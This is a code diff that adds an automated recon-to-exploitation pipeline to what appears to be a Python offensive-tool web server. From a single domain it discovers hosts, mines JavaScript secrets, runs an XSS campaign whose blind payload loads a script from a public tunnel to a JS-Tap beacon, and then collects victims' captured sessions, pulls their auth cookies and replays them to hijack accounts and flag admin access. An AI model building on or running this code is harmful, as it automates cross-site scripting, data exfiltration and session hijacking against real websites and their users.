@@ -31,7 +31,8 @@ import hashlib
 import pickle
 import base64
 import queue
-from concurrent.futures import ThreadPoolExecutor
+import tempfile
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime, timedelta
 from typing import Dict, Any, Optional
 from collections import OrderedDict
@@ -20629,6 +20630,363 @@ def csp_analyze_route():
         return jsonify(result)
     except Exception as e:
         logger.error(f"💥 csp/analyze error: {e}")
+        return jsonify({"error": f"Server error: {e}"}), 500
+
+
+# ─────────────────────────────────────────────────────────
+#  AUTO-RECON PIPELINE  🚀
+# ─────────────────────────────────────────────────────────
+class AutoReconPipeline:
+    """
+    Full automated recon-to-exploitation pipeline.
+    From a single domain name, runs five chained stages:
+
+      Stage 1 — subfinder / amass → httpx  (live host discovery)
+      Stage 2 — CSP analysis + JS secret mining  (parallel, all hosts)
+      Stage 3 — Prioritize injectable / high-value targets
+      Stage 4 — dalfox + kxss XSS campaign  (top N hosts, shared tunnel)
+      Stage 5 — Beacon poll → loot_analyze → session_hijack
+    """
+
+    # ── Stage 1: Host Discovery ───────────────────────────────────────────────
+
+    def _discover_hosts(self, domain: str, use_subfinder: bool, use_amass: bool) -> List[str]:
+        subdomains: set = {domain}
+
+        if use_subfinder:
+            try:
+                res = subprocess.run(
+                    ["subfinder", "-d", domain, "-silent"],
+                    capture_output=True, text=True, timeout=180,
+                )
+                for line in res.stdout.splitlines():
+                    line = line.strip()
+                    if line:
+                        subdomains.add(line)
+                logger.info(f"AutoRecon[1]: subfinder → {len(subdomains)} subdomains")
+            except FileNotFoundError:
+                logger.warning("AutoRecon[1]: subfinder not found — skipping")
+
+        if use_amass:
+            try:
+                res = subprocess.run(
+                    ["amass", "enum", "-passive", "-d", domain],
+                    capture_output=True, text=True, timeout=300,
+                )
+                for line in res.stdout.splitlines():
+                    line = line.strip()
+                    if line and "." in line:
+                        subdomains.add(line)
+                logger.info(f"AutoRecon[1]: amass → {len(subdomains)} total subdomains")
+            except FileNotFoundError:
+                logger.warning("AutoRecon[1]: amass not found — skipping")
+
+        # Probe liveness with httpx
+        tf_path: Optional[str] = None
+        try:
+            with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as tf:
+                for sub in subdomains:
+                    tf.write(sub + "\n")
+                tf_path = tf.name
+
+            res = subprocess.run(
+                ["httpx", "-l", tf_path, "-silent", "-no-fallback", "-json"],
+                capture_output=True, text=True, timeout=120,
+            )
+            live: List[str] = []
+            for line in res.stdout.splitlines():
+                try:
+                    data = json.loads(line)
+                    url    = data.get("url", "")
+                    status = data.get("status_code", 0)
+                    if url and 100 <= status < 500:
+                        live.append(url)
+                except Exception:
+                    pass
+            if live:
+                logger.info(f"AutoRecon[1]: httpx → {len(live)} live hosts")
+                return live
+        except FileNotFoundError:
+            logger.warning("AutoRecon[1]: httpx not found — constructing URLs directly")
+        finally:
+            if tf_path:
+                try:
+                    os.unlink(tf_path)
+                except Exception:
+                    pass
+
+        # Fallback: build https:// URLs without httpx
+        return [f"https://{sub}" for sub in list(subdomains)[:30]]
+
+    # ── Stage 2 workers ───────────────────────────────────────────────────────
+
+    def _csp_worker(self, url: str) -> Dict:
+        try:
+            return csp_analyzer.analyze(url)
+        except Exception as e:
+            return {"url": url, "injectable": False, "error": str(e), "total_findings": 0, "critical": 0, "high": 0}
+
+    def _secret_worker(self, url: str, depth: int) -> Dict:
+        try:
+            # Disable slow external tools for bulk parallel runs
+            return js_secret_miner.run(url, depth=depth, use_trufflehog=False, use_nuclei=False)
+        except Exception as e:
+            return {"url": url, "total_findings": 0, "critical": 0, "high": 0, "findings": [], "error": str(e)}
+
+    # ── Stage 5 helpers ───────────────────────────────────────────────────────
+
+    def _get_jstap_clients(self, beacon_url: str, username: str, password: str) -> List[str]:
+        sess = requests.Session()
+        sess.verify = False
+        if username and password:
+            try:
+                sess.post(f"{beacon_url}/login", data={"username": username, "password": password}, timeout=10)
+            except Exception:
+                pass
+        try:
+            r = sess.get(f"{beacon_url}/api/getClients", timeout=10)
+            if r.ok:
+                clients = r.json()
+                if isinstance(clients, list):
+                    ids = []
+                    for c in clients:
+                        if isinstance(c, dict):
+                            ids.append(c.get("id") or c.get("clientId") or c.get("key", ""))
+                        elif isinstance(c, str):
+                            ids.append(c)
+                    return [i for i in ids if i]
+                elif isinstance(clients, dict):
+                    return list(clients.keys())
+        except Exception:
+            pass
+        return []
+
+    # ── Main orchestrator ─────────────────────────────────────────────────────
+
+    def run(
+        self,
+        domain: str,
+        use_subfinder: bool = True,
+        use_amass: bool = False,
+        js_secret_depth: int = 2,
+        run_xss_pipeline: bool = True,
+        tunnel_provider: str = "auto",
+        tunnel_auth_token: str = "",
+        jstap_port: int = 8444,
+        jstap_username: str = "",
+        jstap_password: str = "",
+        max_hosts_xss: int = 5,
+        run_session_hijack: bool = True,
+        dry_run: bool = False,
+        max_workers: int = 5,
+    ) -> Dict:
+        _start   = time.time()
+        stages: Dict[str, Any] = {}
+
+        logger.info(f"🚀 AutoRecon starting → {domain}  dry_run={dry_run}")
+
+        # ── Stage 1: Host Discovery ──────────────────────────────────────────
+        logger.info("AutoRecon[1/5]: Host discovery")
+        live_hosts = self._discover_hosts(domain, use_subfinder, use_amass)
+        stages["discovery"] = {"domain": domain, "live_hosts": live_hosts, "count": len(live_hosts)}
+
+        if not live_hosts:
+            return {"domain": domain, "error": "No live hosts discovered", "stages": stages,
+                    "duration_sec": round(time.time() - _start, 2)}
+
+        # ── Stage 2: Parallel CSP + JS Secret Mining ─────────────────────────
+        logger.info(f"AutoRecon[2/5]: CSP + secrets on {len(live_hosts)} hosts (workers={max_workers})")
+        csp_results:    Dict[str, Dict] = {}
+        secret_results: Dict[str, Dict] = {}
+
+        with ThreadPoolExecutor(max_workers=max_workers) as ex:
+            csp_futs    = {ex.submit(self._csp_worker,    url):          url for url in live_hosts}
+            secret_futs = {ex.submit(self._secret_worker, url, js_secret_depth): url for url in live_hosts}
+
+            for fut in as_completed(csp_futs):
+                csp_results[csp_futs[fut]] = fut.result()
+
+            for fut in as_completed(secret_futs):
+                secret_results[secret_futs[fut]] = fut.result()
+
+        injectable_hosts = [url for url, r in csp_results.items() if r.get("injectable")]
+        total_secrets    = sum(r.get("total_findings", 0) for r in secret_results.values())
+
+        stages["csp"] = {
+            "hosts_analyzed":   len(csp_results),
+            "injectable_count": len(injectable_hosts),
+            "injectable_hosts": injectable_hosts,
+            "results":          csp_results,
+        }
+        stages["js_secrets"] = {
+            "hosts_scanned":    len(secret_results),
+            "total_findings":   total_secrets,
+            "critical":         sum(r.get("critical", 0) for r in secret_results.values()),
+            "high":             sum(r.get("high", 0)     for r in secret_results.values()),
+            "findings_by_host": {url: r.get("findings", []) for url, r in secret_results.items()},
+        }
+        logger.info(f"AutoRecon[2/5]: {len(injectable_hosts)} injectable | {total_secrets} secret findings")
+
+        # ── Stage 3: Prioritize ──────────────────────────────────────────────
+        def _score(url: str) -> int:
+            s  = 100 if url in injectable_hosts else 0
+            sr = secret_results.get(url, {})
+            s += sr.get("critical", 0) * 10 + sr.get("high", 0) * 5 + sr.get("total_findings", 0)
+            return s
+
+        prioritized = sorted(live_hosts, key=_score, reverse=True)[:max_hosts_xss]
+        stages["prioritization"] = {"hosts_prioritized": prioritized, "max_hosts_xss": max_hosts_xss}
+        logger.info(f"AutoRecon[3/5]: Top {len(prioritized)} targets selected")
+
+        # ── Stage 4: XSS Campaign ────────────────────────────────────────────
+        xss_results: Dict[str, Any] = {}
+        pub_url = ""
+
+        if run_xss_pipeline and not dry_run and prioritized:
+            logger.info(f"AutoRecon[4/5]: XSS campaign on {len(prioritized)} hosts")
+            try:
+                # Start shared JS-Tap + tunnel once
+                jstap_manager.start_server(port=jstap_port)
+                t_res   = tunnel_manager.start(provider=tunnel_provider, auth_token=tunnel_auth_token, local_port=jstap_port)
+                pub_url = t_res.get("public_url", "")
+                telemlib_url = f"{pub_url}/telemlib.js" if pub_url else ""
+
+                for target_url in prioritized:
+                    logger.info(f"AutoRecon[4/5]: scanning {target_url}")
+                    try:
+                        xss_results[target_url] = xss_pipeline.run(
+                            target=target_url,
+                            tunnel_provider=tunnel_provider,
+                            blind_url=telemlib_url,
+                            workers=5,
+                            dry_run=False,
+                            max_dalfox_urls=15,
+                        )
+                    except Exception as xe:
+                        xss_results[target_url] = {"error": str(xe)}
+            except Exception as e:
+                logger.error(f"AutoRecon[4/5]: campaign error: {e}")
+                xss_results["_error"] = str(e)
+
+            stages["xss"] = {
+                "tunnel_url":    pub_url,
+                "hosts_scanned": len([k for k in xss_results if not k.startswith("_")]),
+                "results":       xss_results,
+            }
+        elif dry_run:
+            stages["xss"] = {"dry_run": True, "would_scan": prioritized}
+        else:
+            stages["xss"] = {"skipped": True, "reason": "run_xss_pipeline=False"}
+
+        # ── Stage 5: Post-Exploitation ───────────────────────────────────────
+        hijacked_sessions: List[Dict] = []
+        loot_results:      Dict[str, Any] = {}
+        hijack_results:    Dict[str, Any] = {}
+
+        if run_session_hijack and not dry_run:
+            logger.info("AutoRecon[5/5]: post-exploitation")
+            time.sleep(5)  # Let any async callbacks land
+
+            beacon_url = f"http://localhost:{jstap_port}"
+            client_ids = self._get_jstap_clients(beacon_url, jstap_username, jstap_password)
+            logger.info(f"AutoRecon[5/5]: {len(client_ids)} JS-Tap sessions found")
+
+            for cid in client_ids:
+                try:
+                    lr = loot_intelligence.run(cid, beacon_url=beacon_url,
+                                               username=jstap_username, password=jstap_password)
+                    loot_results[cid] = lr
+
+                    # Extract auth cookies for session replay
+                    auth_cookies = [
+                        {"name": f.get("field", ""), "value": f.get("value", ""), "domain": ""}
+                        for f in lr.get("findings", [])
+                        if f.get("type") == "Auth Cookie"
+                    ]
+                    if auth_cookies:
+                        for target_url in prioritized:
+                            try:
+                                hr = session_hijacker.validate(target=target_url, cookies=auth_cookies)
+                                key = f"{cid}:{target_url}"
+                                hijack_results[key] = hr
+                                if hr.get("session_valid"):
+                                    hijacked_sessions.append({
+                                        "client_id":  cid,
+                                        "target":     target_url,
+                                        "username":   hr.get("discovered_username"),
+                                        "is_admin":   hr.get("has_admin_access"),
+                                        "auth_eps":   hr.get("authenticated_endpoints", []),
+                                        "admin_eps":  hr.get("admin_endpoints", []),
+                                    })
+                            except Exception:
+                                pass
+                except Exception as e:
+                    loot_results[cid] = {"error": str(e)}
+
+            stages["post_exploitation"] = {
+                "sessions_captured":  len(client_ids),
+                "client_ids":         client_ids,
+                "sessions_hijacked":  len(hijacked_sessions),
+                "total_loot_findings": sum(r.get("total_findings", 0) for r in loot_results.values()),
+                "loot_results":       loot_results,
+                "hijacked_sessions":  hijacked_sessions,
+            }
+            logger.info(f"AutoRecon[5/5]: {len(hijacked_sessions)} sessions hijacked")
+        else:
+            stages["post_exploitation"] = {"skipped": True}
+
+        # ── Summary ──────────────────────────────────────────────────────────
+        duration = round(time.time() - _start, 2)
+        xss_findings = sum(
+            len(r.get("dalfox_findings", []))
+            for r in xss_results.values()
+            if isinstance(r, dict) and "dalfox_findings" in r
+        )
+
+        return {
+            "domain":      domain,
+            "duration_sec": duration,
+            "summary": {
+                "live_hosts":           len(live_hosts),
+                "injectable_hosts":     len(injectable_hosts),
+                "js_secret_findings":   total_secrets,
+                "xss_hosts_scanned":    len([k for k in xss_results if not k.startswith("_")]),
+                "xss_findings":         xss_findings,
+                "sessions_captured":    len(stages.get("post_exploitation", {}).get("client_ids", [])),
+                "sessions_hijacked":    len(hijacked_sessions),
+                "admin_sessions":       sum(1 for s in hijacked_sessions if s.get("is_admin")),
+            },
+            "stages":            stages,
+            "hijacked_sessions": hijacked_sessions,
+        }
+
+
+auto_recon_pipeline = AutoReconPipeline()
+
+
+@app.route("/api/tools/pipeline/autorecon", methods=["POST"])
+def auto_recon_route():
+    try:
+        params = request.json or {}
+        result = auto_recon_pipeline.run(
+            domain=params.get("domain", ""),
+            use_subfinder=bool(params.get("use_subfinder", True)),
+            use_amass=bool(params.get("use_amass", False)),
+            js_secret_depth=int(params.get("js_secret_depth", 2)),
+            run_xss_pipeline=bool(params.get("run_xss_pipeline", True)),
+            tunnel_provider=params.get("tunnel_provider", "auto"),
+            tunnel_auth_token=params.get("tunnel_auth_token", ""   ),
+            jstap_port=int(params.get("jstap_port", 8444)),
+            jstap_username=params.get("jstap_username", ""),
+            jstap_password=params.get("jstap_password", ""),
+            max_hosts_xss=int(params.get("max_hosts_xss", 5)),
+            run_session_hijack=bool(params.get("run_session_hijack", True)),
+            dry_run=bool(params.get("dry_run", False)),
+            max_workers=int(params.get("max_workers", 5)),
+        )
+        return jsonify(result)
+    except Exception as e:
+        logger.error(f"💥 autorecon error: {e}")
         return jsonify({"error": f"Server error: {e}"}), 500
 
 
